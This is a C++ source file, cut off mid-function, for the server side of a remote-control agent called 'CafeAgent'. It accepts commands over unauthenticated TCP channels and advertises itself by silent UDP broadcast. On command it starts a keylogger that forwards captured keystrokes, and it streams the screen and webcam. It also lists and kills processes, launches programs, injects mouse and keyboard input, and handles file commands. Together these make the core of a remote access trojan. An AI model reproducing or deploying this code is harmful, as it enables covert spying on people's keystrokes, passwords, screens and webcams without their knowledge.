#include "core/BackendServer.hpp"
#include "core/BroadcastBus.hpp"
#include "core/StreamSession.hpp"
#include "interfaces/IVideoStreamer.hpp"
#include "interfaces/IKeylogger.hpp"
#include "interfaces/IAppManager.hpp"
#include "interfaces/IInputInjector.hpp"
#include "core/network/TcpSocket.hpp"
#include "core/network/PacketDispatcher.hpp"
#include "handlers/FileCommandHandler.hpp"
#include <cstring>
#include <iostream>
#include <algorithm>
#include <deque>
#include <sstream>
#include <thread>
#include <chrono>
#include <condition_variable>
#include <mutex>
#include <atomic>

#ifdef _WIN32
#include <winsock2.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#else
#include <poll.h>
#endif

// ACK-Based Flow Control - Traffic Class Constants
constexpr uint8_t TRAFFIC_CONTROL = 0x01;  // Commands, Status, Info - Never drop
constexpr uint8_t TRAFFIC_VIDEO   = 0x02;  // Video frames - Drop if busy
// Note: TRAFFIC_ACK (0x03) is Frontend -> Gateway only

namespace core {

    BackendServer::BackendServer(
        uint16_t port,
        std::shared_ptr<BroadcastBus> bus_monitor,
        std::shared_ptr<BroadcastBus> bus_webcam,
        std::shared_ptr<StreamSession> session,
        std::shared_ptr<StreamSession> webcam_session,
        std::shared_ptr<interfaces::IKeylogger> keylogger,
        std::shared_ptr<interfaces::IAppManager> app_manager,
        std::shared_ptr<interfaces::IInputInjector> input_injector,
        std::shared_ptr<interfaces::IFileTransfer> file_transfer
    ) : gateway_port_(port), bus_monitor_(bus_monitor), bus_webcam_(bus_webcam), session_(session),
        webcam_session_(webcam_session), keylogger_(keylogger), app_manager_(app_manager),
        input_injector_(input_injector), file_transfer_(file_transfer) {

        // Initialize Command Dispatcher and Register Handlers
        dispatcher_ = std::make_unique<command::CommandDispatcher>();

        // Initialize ThreadPool for async command execution (4 workers)
        command_pool_ = std::make_unique<ThreadPool>(4);
        std::cout << "[BackendServer] ThreadPool initialized with 4 workers" << std::endl;

        if (file_transfer_) {
            dispatcher_->register_handler(std::make_shared<handlers::FileCommandHandler>(*file_transfer_));
        }
    }

    BackendServer::~BackendServer() {
        stop();
    }

    void BackendServer::run() {
        running_ = true;
        uint16_t data_port = gateway_port_ + DATA_PORT_OFFSET;

        std::cout << "[BackendServer] Agent Starting (Dual Channel Mode)..." << std::endl;
        std::cout << "[BackendServer] Control Channel: port " << gateway_port_ << std::endl;
        std::cout << "[BackendServer] Data Channel: port " << data_port << std::endl;

        // ===== CREATE CONTROL LISTEN SOCKET =====
        listen_fd_ = socket(AF_INET, SOCK_STREAM, 0);
        if (!IS_VALID_SOCKET(listen_fd_)) {
            std::cerr << "[BackendServer] Failed to create control socket" << std::endl;
            return;
        }

        int opt = 1;
        setsockopt(listen_fd_, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(gateway_port_);

        if (bind(listen_fd_, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            std::cerr << "[BackendServer] Failed to bind control port " << gateway_port_ << std::endl;
            CLOSE_SOCKET(listen_fd_);
            return;
        }

        if (listen(listen_fd_, 5) < 0) {
            std::cerr << "[BackendServer] Failed to listen on control port" << std::endl;
            CLOSE_SOCKET(listen_fd_);
            return;
        }

        // ===== CREATE DATA LISTEN SOCKET =====
        listen_fd_data_ = socket(AF_INET, SOCK_STREAM, 0);
        if (!IS_VALID_SOCKET(listen_fd_data_)) {
            std::cerr << "[BackendServer] Failed to create data socket" << std::endl;
            CLOSE_SOCKET(listen_fd_);
            return;
        }

        setsockopt(listen_fd_data_, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));

        struct sockaddr_in data_addr;
        memset(&data_addr, 0, sizeof(data_addr));
        data_addr.sin_family = AF_INET;
        data_addr.sin_addr.s_addr = INADDR_ANY;
        data_addr.sin_port = htons(data_port);

        if (bind(listen_fd_data_, (struct sockaddr*)&data_addr, sizeof(data_addr)) < 0) {
            std::cerr << "[BackendServer] Failed to bind data port " << data_port << std::endl;
            CLOSE_SOCKET(listen_fd_);
            CLOSE_SOCKET(listen_fd_data_);
            return;
        }

        if (listen(listen_fd_data_, 5) < 0) {
            std::cerr << "[BackendServer] Failed to listen on data port" << std::endl;
            CLOSE_SOCKET(listen_fd_);
            CLOSE_SOCKET(listen_fd_data_);
            return;
        }

        // Start Discovery Broadcaster in background thread
        discovery_thread_ = std::thread(&BackendServer::broadcast_discovery, this);

        // Accept loop - wait for BOTH connections before proceeding
        while (running_) {
            struct sockaddr_in client_addr;
            socklen_t addr_len = sizeof(client_addr);

            // 1. Accept Control connection
            std::cout << "[BackendServer] Waiting for Gateway Control connection..." << std::endl;
            socket_t control_fd = accept(listen_fd_, (struct sockaddr*)&client_addr, &addr_len);

            if (!IS_VALID_SOCKET(control_fd)) continue;

            char ip_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &client_addr.sin_addr, ip_str, sizeof(ip_str));
            std::cout << "[BackendServer] Control connected from " << ip_str << std::endl;

            // Set Non-Blocking Mode for Control Socket
            #ifdef _WIN32
            u_long mode_ctrl = 1;
            ioctlsocket(control_fd, FIONBIO, &mode_ctrl);
            // ENABLE TCP_NODELAY (Disable Nagle)
            int flag_ctrl = 1;
            setsockopt(control_fd, IPPROTO_TCP, TCP_NODELAY, (char*)&flag_ctrl, sizeof(flag_ctrl));
            #else
            int flags_ctrl = fcntl(control_fd, F_GETFL, 0);
            fcntl(control_fd, F_SETFL, flags_ctrl | O_NONBLOCK);
            // ENABLE TCP_NODELAY (Disable Nagle)
            int flag_ctrl = 1;
            setsockopt(control_fd, IPPROTO_TCP, TCP_NODELAY, &flag_ctrl, sizeof(flag_ctrl));
            #endif

            // 2. Accept Data connection (with 5 second timeout)
            std::cout << "[BackendServer] Waiting for Gateway Data connection..." << std::endl;

            // Set timeout on data listen socket
            #ifdef _WIN32
            DWORD timeout = 5000;
            setsockopt(listen_fd_data_, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
            #else
            struct timeval tv;
            tv.tv_sec = 5;
            tv.tv_usec = 0;
            setsockopt(listen_fd_data_, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            #endif

            socket_t data_fd = accept(listen_fd_data_, (struct sockaddr*)&client_addr, &addr_len);

            if (!IS_VALID_SOCKET(data_fd)) {
                std::cerr << "[BackendServer] Data connection timeout/failed. Closing control." << std::endl;
                CLOSE_SOCKET(control_fd);
                continue;
            }

            std::cout << "[BackendServer] Data connected. Dual channel established!" << std::endl;

            // Set Non-Blocking Mode for Data Socket
            #ifdef _WIN32
            u_long mode_data = 1;
            ioctlsocket(data_fd, FIONBIO, &mode_data);
            // ENABLE TCP_NODELAY (Disable Nagle)
            int flag_data = 1;
            setsockopt(data_fd, IPPROTO_TCP, TCP_NODELAY, (char*)&flag_data, sizeof(flag_data));
            #else
            int flags_data = fcntl(data_fd, F_GETFL, 0);
            fcntl(data_fd, F_SETFL, flags_data | O_NONBLOCK);
            // ENABLE TCP_NODELAY (Disable Nagle)
            int flag_data = 1;
            setsockopt(data_fd, IPPROTO_TCP, TCP_NODELAY, &flag_data, sizeof(flag_data));
            #endif

            handle_connection(control_fd, data_fd);

            std::cout << "[BackendServer] Gateway disconnected. Waiting for reconnection..." << std::endl;
        }

        CLOSE_SOCKET(listen_fd_);
        CLOSE_SOCKET(listen_fd_data_);
    }

    void BackendServer::broadcast_discovery() {
        // Discovery packet format (Matched to Gateway's discovery.h)
        #pragma pack(push, 1)
        struct {
            uint32_t magic;
            uint16_t service_port;
            char advertised_hostname[64];
        } packet;
        #pragma pack(pop)

        packet.magic = htonl(0xCAFE1234);
        packet.service_port = htons(gateway_port_);
        memset(packet.advertised_hostname, 0, sizeof(packet.advertised_hostname));

        std::cout << "[Discovery] Broadcasting presence on UDP port 9999..." << std::endl;

        while (running_) {
            #ifdef _WIN32
            // Windows: Broadcast on ALL INTERFACES to pass through VMWare/Host/WiFi appropriately
            ULONG outBufLen = 15000;
            PIP_ADAPTER_ADDRESSES pAddresses = (IP_ADAPTER_ADDRESSES *)malloc(outBufLen);

            // First call to get size (or try default)
            ULONG flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER;
            if (GetAdaptersAddresses(AF_INET, flags, NULL, pAddresses, &outBufLen) == ERROR_BUFFER_OVERFLOW) {
                free(pAddresses);
                pAddresses = (IP_ADAPTER_ADDRESSES *)malloc(outBufLen);
            }

            if (pAddresses && GetAdaptersAddresses(AF_INET, flags, NULL, pAddresses, &outBufLen) == NO_ERROR) {
                 for (PIP_ADAPTER_ADDRESSES pCurr = pAddresses; pCurr != NULL; pCurr = pCurr->Next) {
                      if (pCurr->OperStatus != IfOperStatusUp) continue;

                       for (PIP_ADAPTER_UNICAST_ADDRESS pUni = pCurr->FirstUnicastAddress; pUni != NULL; pUni = pUni->Next) {
                            if (pUni->Address.lpSockaddr->sa_family == AF_INET) {
                                // Silent broadcast - logs disabled for production
                                SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
                                if (sock != INVALID_SOCKET) {
                                    int bOpt = 1;
                                    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char*)&bOpt, sizeof(bOpt));

                                    if (bind(sock, pUni->Address.lpSockaddr, pUni->Address.iSockaddrLength) == 0) {
                                        struct sockaddr_in dest;
                                        dest.sin_family = AF_INET;
                                        dest.sin_port = htons(9999);
                                        dest.sin_addr.s_addr = INADDR_BROADCAST;
                                        sendto(sock, (const char*)&packet, sizeof(packet), 0, (struct sockaddr*)&dest, sizeof(dest));
                                    }
                                    closesocket(sock);
                                }
                            }
                       }
                 }
            }
            if (pAddresses) free(pAddresses);

            #else
            // Linux/Standard: General Broadcast
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock >= 0) {
                int bOpt = 1;
                setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &bOpt, sizeof(bOpt));

                struct sockaddr_in dest;
                memset(&dest, 0, sizeof(dest));
                dest.sin_family = AF_INET;
                dest.sin_port = htons(9999);

                // 1. General Broadcast (for other machines)
                dest.sin_addr.s_addr = INADDR_BROADCAST;
                sendto(sock, (const char*)&packet, sizeof(packet), 0, (struct sockaddr*)&dest, sizeof(dest));

                // 2. Loopback Broadcast (for same-machine discovery)
                // On some Linux configs, INADDR_BROADCAST doesn't loop back to lo
                dest.sin_addr.s_addr = inet_addr("127.0.0.1");
                if (sendto(sock, (const char*)&packet, sizeof(packet), 0, (struct sockaddr*)&dest, sizeof(dest)) > 0) {
                    // Success log (throttled conceptually by loop sleep)
                    // std::cout << "[Discovery] Sent packet to 127.0.0.1:9999" << std::endl;
                }

                close(sock);
            }
            #endif

            // Silent wait - no logging for production
            std::this_thread::sleep_for(std::chrono::seconds(3));
        }
        std::cout << "[Discovery] Stopped broadcasting" << std::endl;
    }

    void BackendServer::stop() {
        running_ = false;

        // Close listen socket to break accept()
        if (IS_VALID_SOCKET(listen_fd_)) {
            CLOSE_SOCKET(listen_fd_);
        }

        // Wait for discovery thread
        if (discovery_thread_.joinable()) {
            discovery_thread_.join();
        }
    }

    void BackendServer::handle_connection(socket_t fd_control, socket_t fd_data) {
        // === CONTROL CHANNEL SOCKET ===
        auto socket_control = std::make_shared<network::TcpSocket>(fd_control);
        socket_control->set_non_blocking(true);
        socket_control->set_no_delay(true);
        socket_control->set_send_buffer_size(64 * 1024); // Smaller for control

        // === DATA CHANNEL SOCKET ===
        auto socket_data = std::make_shared<network::TcpSocket>(fd_data);
        socket_data->set_non_blocking(true);
        socket_data->set_no_delay(true);
        socket_data->set_send_buffer_size(512 * 1024); // Larger for video

        auto dispatcher = std::make_shared<network::PacketDispatcher>(socket_control);
        // A mutex to protect writes to the client socket
        auto client_mutex = std::make_shared<std::mutex>();

        // Helper for cross-platform poll/select
        auto wait_for_write = [](socket_t fd, int timeout_ms) -> bool {
            #ifdef _WIN32
                WSAPOLLFD pfd;
                pfd.fd = fd;
                pfd.events = POLLOUT;
                pfd.revents = 0;
                int ret = WSAPoll(&pfd, 1, timeout_ms);
            #else
                struct pollfd pfd;
                pfd.fd = fd;
                pfd.events = POLLOUT;
                pfd.revents = 0;
                int ret = poll(&pfd, 1, timeout_ms);
            #endif

            if (ret > 0 && (pfd.revents & POLLOUT)) return true;
            return false;
        };

        static const int HEADER_SIZE = 12; // 4 bytes for len, 4 for cid, 4 for bid

        // Application-Level Priority Queue
        // We buffer messages here to ensure Control messages jump ahead of Video data
        // before writing to the Kernel TCP Buffer.

        struct QueuedPacket {
             std::vector<uint8_t> data; // Full packet with headers pre-built
             bool is_critical;
        };

        // Using shared_ptr to share queues with the flush logic
        auto high_prio_q = std::make_shared<std::deque<QueuedPacket>>();
        auto low_prio_q = std::make_shared<std::deque<QueuedPacket>>();
        auto queue_mutex = std::make_shared<std::mutex>();

        // Writer Thread Control
        auto stop_writer = std::make_shared<std::atomic<bool>>(false);
        auto cv_writer = std::make_shared<std::condition_variable>();

        // --- DEDICATED WRITER THREAD (DUAL CHANNEL) ---
        // Routes Critical packets to fd_control, Data packets to fd_data
        std::thread writer_thread([fd_control, fd_data, high_prio_q, low_prio_q, queue_mutex, wait_for_write, stop_writer, cv_writer]() {
            while (!*stop_writer) {
                std::vector<QueuedPacket> batch;

                // 1. POP BATCH UNDER LOCK (Fast)
                {
                    std::unique_lock<std::mutex> lock(*queue_mutex);

                    // Wait for data or stop signal
                    cv_writer->wait(lock, [&]() {
                        return !high_prio_q->empty() || !low_prio_q->empty() || *stop_writer;
                    });

                    if (*stop_writer && high_prio_q->empty() && low_prio_q->empty()) break;

                    // Prioritize High Queue
                    // Move ALL High Priority items to local batch
                    while (!high_prio_q->empty()) {
                        batch.push_back(std::move(high_prio_q->front()));
                        high_prio_q->pop_front();
                    }

                     // If High empty, take ONE Low Priority (Video) item
                     // Why one? To check High again quickly.
                     if (batch.empty() && !low_prio_q->empty()) {
                         batch.push_back(std::move(low_prio_q->front()));
                         low_prio_q->pop_front();
                     }
                } // Unlock here!

                // 2. SEND BATCH WITHOUT LOCK (Blocking I/O allowed here)
                for (auto& pkt : batch) {
                    // === DUAL CHANNEL ROUTING ===
                    // Critical packets (commands/status) → Control channel (fd_control)
                    // Data packets (video/keylog) → Data channel (fd_data)
                    socket_t target_fd = pkt.is_critical ? fd_control : fd_data;

                    // DIAGNOSTIC: Log before sending (disabled for production)
                    // if (pkt.is_critical && pkt.data.size() > 12) {
                    //     std::string preview((char*)pkt.data.data() + 12, std::min((size_t)30, pkt.data.size() - 12));
                    //     auto now = std::chrono::high_resolution_clock::now();
                    //     auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count();
                    //     std::cout << "[WRITER] Sending critical: " << preview << " at " << ms << "ms (size=" << pkt.data.size() << ")" << std::endl;
                    // }

                    size_t total = pkt.data.size();
                    size_t total_sent = 0;

                    while (total_sent < total) {
                        ssize_t n = send(target_fd, (const char*)pkt.data.data() + total_sent, total - total_sent, 0);

                        if (n < 0) {
                            #ifdef _WIN32
                            if (WSAGetLastError() == WSAEWOULDBLOCK) {
                            #else
                            if (errno == EWOULDBLOCK || errno == EAGAIN) {
                            #endif
                                // If critical, we MUST wait and retry multiple times.
                                if (pkt.is_critical) {
                                    int retries = 0;
                                    // INCREASED RETRY: 50 retries * 100ms = 5 seconds max wait
                                    // This prevents dropping large critical data (like app lists) during video congestion
                                    while (retries < 50) {
                                        if (wait_for_write(target_fd, 100)) { // Wait 100ms each
                                            break; // Socket writable, exit retry loop to attempt send
                                        }
                                        retries++;
                                    }
                                    if (retries < 50) continue; // Retry send
                                    // All retries exhausted - log nothing to avoid lag, just break
                                    break;
                                } else {
                                    // Low priority (video): Drop if blocked to avoid lag
                                    break;
                                }
                            }
                            // Real Error
                            break;
                        }

                        if (n > 0) total_sent += n;
                    }

                    // DIAGNOSTIC: Log after sending (disabled for production)
                    // if (pkt.is_critical && pkt.data.size() > 12 && total_sent == total) {
                    //     std::string preview((char*)pkt.data.data() + 12, std::min((size_t)30, pkt.data.size() - 12));
                    //     auto now = std::chrono::high_resolution_clock::now();
                    //     auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count();
                    //     std::cout << "[WRITER] ✓ Sent " << total_sent << " bytes: " << preview << " at " << ms << "ms" << std::endl;
                    // } else if (pkt.is_critical && total_sent < total) {
                    //     std::string preview((char*)pkt.data.data() + 12, std::min((size_t)20, pkt.data.size() - 12));
                    //     std::cout << "[WRITER] ✗ PARTIAL SEND: " << preview << " (" << total_sent << "/" << total << ")" << std::endl;
                    // }
                }
            }
        });

        // Sender Lambda: Queues packets for writer_thread to process
        auto sender = [this, high_prio_q, low_prio_q, queue_mutex, cv_writer](const std::vector<uint8_t>& data, uint8_t prefix, bool is_critical, uint32_t target_cid, uint32_t target_bid) {

            // 1. Build Full Packet Buffer
            uint32_t len = data.size() + (prefix != 0 ? 1 : 0);
            uint32_t net_len = htonl(len);
            uint32_t net_cid = htonl(target_cid);
            uint32_t net_bid = htonl(target_bid);

            std::vector<uint8_t> packet;
            packet.reserve(12 + len); // Header size known as 12 locally if constant removed

            uint8_t header[12];
            memcpy(header, &net_len, 4);
            memcpy(header+4, &net_cid, 4);
            memcpy(header+8, &net_bid, 4);

            packet.insert(packet.end(), header, header + 12);
            if (prefix != 0) packet.push_back(prefix);
            packet.insert(packet.end(), data.begin(), data.end());

            // 2. Queue It (Fast)
            {
                std::lock_guard<std::mutex> lock(*queue_mutex);
                if (is_critical) {
                    high_prio_q->push_back({packet, true});
                } else {
                    // Limit video buffer depth (5 frames max) to prevent lag
                    if (low_prio_q->size() < 5) {
                        low_prio_q->push_back({packet, false});
                    }
                }
            }

            // 3. Wake Writer
            cv_writer->notify_one();
        };

        auto send_text = [&](const std::string& msg, uint32_t t_cid, uint32_t t_bid) {
            std::vector<uint8_t> b(msg.begin(), msg.end());
            // Route ALL text messages to Control Channel (critical) to prevent drops
            // This ensures "DATA:APPS:..." and "DATA:PROCS:..." are reliable.
            bool critical = true;
            // ACK Flow Control: All text messages use TRAFFIC_CONTROL prefix
            sender(b, TRAFFIC_CONTROL, critical, t_cid, t_bid);
        };

        // Helper for cross-platform poll/select READ
        auto wait_for_read = [](socket_t fd, int timeout_ms) -> bool {
            #ifdef _WIN32
                WSAPOLLFD pfd;
                pfd.fd = fd;
                pfd.events = POLLIN;
                pfd.revents = 0;
                int ret = WSAPoll(&pfd, 1, timeout_ms);
            #else
                struct pollfd pfd;
                pfd.fd = fd;
                pfd.events = POLLIN;
                pfd.revents = 0;
                int ret = poll(&pfd, 1, timeout_ms);
            #endif

            if (ret > 0 && (pfd.revents & POLLIN)) return true;
            return false;
        };

        // --- READ HANDLER (READS FROM CONTROL CHANNEL) ---
        // Commands come in via control channel only
        auto read_frame_lambda = [&](socket_t sock_fd, std::vector<uint8_t>& out_payload, uint32_t& out_cid, uint32_t& out_bid) -> bool {
            uint8_t header[HEADER_SIZE];
            size_t got = 0;
            while(got < HEADER_SIZE) {
                auto [n, err] = socket_control->recv(header + got, HEADER_SIZE - got);
                if (n > 0) got += n;
                else if (err == network::SocketError::WouldBlock) {
                    // OPTIMIZATION: Wait for data instead of sleep
                    if (wait_for_read(sock_fd, 10)) { // Wait up to 10ms for data
                        continue;
                    }
                    // If timeout, just loop back (outer loop handles keepalive check implicitly or eventually)
                    // For responsiveness, we yield briefly if truly idle, but poll handles the wait.
                    continue;
                }
                else return false; // Error or connection closed
            }

            uint32_t net_len; memcpy(&net_len, header, 4);
            uint32_t len = ntohl(net_len);
            uint32_t net_cid; memcpy(&net_cid, header+4, 4);
            out_cid = ntohl(net_cid);
            uint32_t net_bid; memcpy(&net_bid, header+8, 4);
            out_bid = ntohl(net_bid);

            if (len > 10 * 1024 * 1024) return false; // Prevent huge allocations

            out_payload.resize(len);
            if(len > 0) {
                got = 0;
                while(got < len) {
                    auto [n, err] = socket_control->recv(out_payload.data() + got, len - got);
                    if (n > 0) got += n;
                    else if (err == network::SocketError::WouldBlock) {
                         // OPTIMIZATION: Wait for data instead of sleep
                        if (wait_for_read(sock_fd, 10)) {
                            continue;
                        }
                        continue;
                    }
                    else return false; // Error or connection closed
                }
            }
            return true;
        };

        uint32_t cid = 0;
        uint32_t bid = 0; // Capture BID for echo
        std::vector<uint8_t> payload;

        uint32_t my_backend_id = 1; // Default to 1

        while (true) {
            if (!read_frame_lambda(fd_control, payload, cid, bid)) break;

            // Log Command Receipt (Latency Debugging)
            if (payload.size() < 100) {
                 std::string d_str(payload.begin(), payload.end());
                 if (d_str.find("stop_keylog") == 0 || d_str.find("start_keylog") == 0) {
                     auto now = std::chrono::system_clock::now();
                     auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count();
                     std::cout << "[CMD] " << d_str << " received at " << ms << "ms" << std::endl;
                 }
            }

            if (bid != 0) {
                my_backend_id = bid;
            }
            if (my_backend_id == 0) my_backend_id = 1; // Fallback default

            std::string msg(payload.begin(), payload.end());
            msg.erase(std::find(msg.begin(), msg.end(), '\0'), msg.end());

            if (msg.find("mouse_move") == std::string::npos) {
                // std::cout << "[CMD] " << msg << " [CID=" << cid << "]" << std::endl;
            }

            std::stringstream ss(msg);
            std::string cmd; ss >> cmd;

            // Dispatch File Commands through the CommandDispatcher (ASYNC)
            if (cmd.rfind("file_", 0) == 0) {
                if (dispatcher_) {
                    core::command::CommandContext ctx;
                    ctx.client_id = cid;
                    ctx.backend_id = my_backend_id;
                    // Create a responder that wraps the local sender lambda
                    ctx.respond = [sender, cid, my_backend_id](std::vector<uint8_t>&& d, bool c) {
                        sender(d, 0x01, c, cid, my_backend_id);
                    };

                    // ASYNC: File operations can be slow (disk I/O)
                    command_pool_->submit_detached([this, msg, ctx]() mutable {
                        dispatcher_->dispatch(msg, ctx);
                    });
                }
                continue; // Skip legacy handling
            }

            if (cmd == "ping") {
                #ifdef PLATFORM_LINUX
                     send_text("INFO:NAME=CafeAgent-Linux", cid, my_backend_id);
                     send_text("INFO:OS=Linux", cid, my_backend_id);
                #elif defined(PLATFORM_WINDOWS)
                     send_text("INFO:NAME=CafeAgent-Windows", cid, my_backend_id);
                     send_text("INFO:OS=Windows", cid, my_backend_id);
                #elif defined(PLATFORM_MACOS)
                     send_text("INFO:NAME=CafeAgent-macOS", cid, my_backend_id);
                     send_text("INFO:OS=MacOS", cid, my_backend_id);
                #else
                     send_text("INFO:NAME=CafeAgent-Mock", cid, my_backend_id);
                #endif
            }
            else if (cmd == "start_monitor_stream") {
                 uint32_t sub_cid = cid;
                 uint32_t sub_bid = my_backend_id;

                 // ASYNC: Streaming startup
                 command_pool_->submit_detached([this, cid, my_backend_id, send_text, sub_cid, sub_bid, sender]() {
                     bus_monitor_->subscribe(sub_cid, [sender, sub_cid, sub_bid](const std::vector<uint8_t>& d){
                         // Protocol: [TRAFFIC_VIDEO][ChannelID][VideoData]
                         // ChannelID: 0x01 = Monitor, 0x02 = Webcam
                         std::vector<uint8_t> payload;
                         payload.reserve(1 + d.size());
                         payload.push_back(0x01); // Channel: Monitor
                         payload.insert(payload.end(), d.begin(), d.end());

                         sender(payload, TRAFFIC_VIDEO, false, sub_cid, sub_bid);
                     });

                     auto res = session_->start();
                     if(res.is_err() && res.error().code != common::ErrorCode::Busy) send_text("ERROR:StartStream:" + res.error().message, cid, my_backend_id);
                     else send_text("STATUS:MONITOR_STREAM:STARTED", cid, my_backend_id);
                 });
            }
            else if (cmd == "stop_monitor_stream") {
                 // ASYNC: Streaming cleanup
                 command_pool_->submit_detached([this, cid, my_backend_id, send_text]() {
                     bus_monitor_->unsubscribe(cid);
                     session_->stop();
                     send_text("STATUS:MONITOR_STREAM:STOPPED", cid, my_backend_id);
                 });
            }
            else if (cmd == "start_webcam_stream") {
               uint32_t sub_cid = cid;
               uint32_t sub_bid = my_backend_id;

               // ASYNC: Webcam startup
               command_pool_->submit_detached([this, cid, my_backend_id, send_text, sub_cid, sub_bid, sender]() {
                   bus_webcam_->subscribe(sub_cid, [sender, sub_cid, sub_bid](const std::vector<uint8_t>& d){
                       // Protocol: [TRAFFIC_VIDEO][ChannelID][VideoData]
                       std::vector<uint8_t> payload;
                       payload.reserve(1 + d.size());
                       payload.push_back(0x02); // Channel: Webcam
                       payload.insert(payload.end(), d.begin(), d.end());

                       sender(payload, TRAFFIC_VIDEO, false, sub_cid, sub_bid);
                   });
                   auto res = webcam_session_->start();
                   if(res.is_err() && res.error().code != common::ErrorCode::Busy) send_text("ERROR:StartWebcam:" + res.error().message, cid, my_backend_id);
                   else send_text("STATUS:WEBCAM_STREAM:STARTED", cid, my_backend_id);
               });
            }
            else if (cmd == "stop_webcam_stream") {
                 // ASYNC: Webcam cleanup
                 command_pool_->submit_detached([this, cid, my_backend_id, send_text]() {
                     bus_webcam_->unsubscribe(cid);
                     webcam_session_->stop();
                     send_text("STATUS:WEBCAM_STREAM:STOPPED", cid, my_backend_id);
                 });
            }
            else if (cmd == "start_keylog") {
                uint32_t sub_cid = cid;
                uint32_t sub_bid = my_backend_id;

                // ASYNC: Keylogger startup
                command_pool_->submit_detached([this, cid, my_backend_id, send_text, sub_cid, sub_bid, sender]() {
                    auto res = keylogger_->start([sender, sub_cid, sub_bid](const interfaces::KeyEvent& k){
                        std::string s = "KEYLOG: " + k.text;
                        std::vector<uint8_t> b(s.begin(), s.end());
                        // ACK Flow Control: Keylogs use TRAFFIC_CONTROL (never drop)
                        sender(b, TRAFFIC_CONTROL, true, sub_cid, sub_bid);
                    });
                    if(res.is_err()) send_text("ERROR:Keylog:" + res.error().message, cid, my_backend_id);
                    else send_text("STATUS:KEYLOGGER:STARTED", cid, my_backend_id);
                });
            }
            else if (cmd == "stop_keylog") {
                // ASYNC: Keylogger shutdown involves unhooking (potentially slow)
                 command_pool_->submit_detached([this, cid, my_backend_id, send_text]() {
                    std::cout << "[CMD] stop_keylog received at " << std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count() << "ms" << std::endl;
                    keylogger_->stop();
                    std::cout << "[CMD] keylogger_->stop() completed, sending STATUS..." << std::endl;
                    send_text("STATUS:KEYLOGGER:STOPPED", cid, my_backend_id);
                    std::cout << "[CMD] STATUS:KEYLOGGER:STOPPED queued" << std::endl;
                 });
            }
            else if (cmd == "list_apps" || cmd == "get_apps") {
                // ASYNC: Heavy operation - dispatch to thread pool
                command_pool_->submit_detached([this, cid, my_backend_id, send_text]() {
                    auto apps = app_manager_->list_applications(false);
                    std::string res = "DATA:APPS:";
                    for(size_t i=0; i<apps.size(); ++i) {
                         const auto& a = apps[i];
                         if(i > 0) res += ";";
                         res += a.id + "|" + a.name + "|" + a.icon + "|" + a.exec + "|" + a.keywords;
                    }
                    send_text(res, cid, my_backend_id);
                });
            }
            else if (cmd == "list_process") {
                // ASYNC: Heavy operation - dispatch to thread pool
                command_pool_->submit_detached([this, cid, my_backend_id, send_text]() {
                    auto procs = app_manager_->list_applications(true); // true = running processes
                    std::string res = "DATA:PROCS:";
                    for(size_t i=0; i<procs.size(); ++i) {
                         const auto& p = procs[i];
                         if(i > 0) res += ";";
                         // Format: PID|Name|Icon|Exec|Keywords (reusing AppEntry structure)
                         res += std::to_string(p.pid) + "|" + p.name + "|-|" + p.exec + "|Running";
                    }
                    send_text(res, cid, my_backend_id);
                });
            }
            else if (cmd == "launch_app") {
                std::string args;
                if (msg.size() > 11) args = msg.substr(11);
                // ASYNC: Process creation can block
                command_pool_->submit_detached([this, cid, my_backend_id, send_text, args]() {
                    auto res = app_manager_->launch_app(args);
                    if(res.is_ok()) send_text("STATUS:APP_LAUNCHED:" + std::to_string(res.unwrap()), cid, my_backend_id);
                    else send_text("ERROR:Launch:" + res.error().message, cid, my_backend_id);
                });
            }
            else if (cmd == "mouse_move") {
                float x, y; ss >> x >> y;
                if(input_injector_) input_injector_->move_mouse(x, y);
            }
            else if (cmd == "mouse_down") {
                 int btn; ss >> btn;
                 if(input_injector_) input_injector_->click_mouse((interfaces::MouseButton)btn, true);
            }
            else if (cmd == "mouse_up") {
                 int btn; ss >> btn;
                 if(input_injector_) input_injector_->click_mouse((interfaces::MouseButton)btn, false);
            }
            else if (cmd == "mouse_click") {
                 int btn; ss >> btn;
                  if(input_injector_) {
                     input_injector_->click_mouse((interfaces::MouseButton)btn, true);
                     std::this_thread::sleep_for(std::chrono::milliseconds(20));
                     input_injector_->click_mouse((interfaces::MouseButton)btn, false);
                 }
            }
            else if (cmd == "mouse_scroll") {
                int delta; ss >> delta;
                if(input_injector_) input_injector_->scroll_mouse(delta);
            }
            else if (cmd == "key_down") {
                int code; ss >> code;
                if(input_injector_) input_injector_->press_key(static_cast<interfaces::KeyCode>(code), true);
            }
            else if (cmd == "key_up") {
                int code; ss >> code;
                if(input_injector_) input_injector_->press_key(static_cast<interfaces::KeyCode>(code), false);
            }
            else if (cmd == "text_input") {
                std::string text;
                if(ss.peek() == ' ') ss.ignore();
                std::getline(ss, text);
                if(input_injector_) input_injector_->send_text(text);
            }
            else if (cmd == "kill_process") {
                 uint32_t pid; ss >> pid;
                 // ASYNC: Process termination
                 command_pool_->submit_detached([this, cid, my_backend_id, send_text, pid]() {
                     app_manager_->kill_process(pid);
                     send_text("STATUS:PROCESS_KILLED", cid, my_backend_id);
                 });
            }
            else if (cmd == "search_apps") {
                // ASYNC: Heavy operation - dispatch to thread pool
                std::string query;
                if(msg.size() > 12) query = msg.substr(12);
                command_pool_->submit_detached([this, cid, my_backend_id, send_text, query]() {
                    auto apps = app_manager_->search_apps(query);
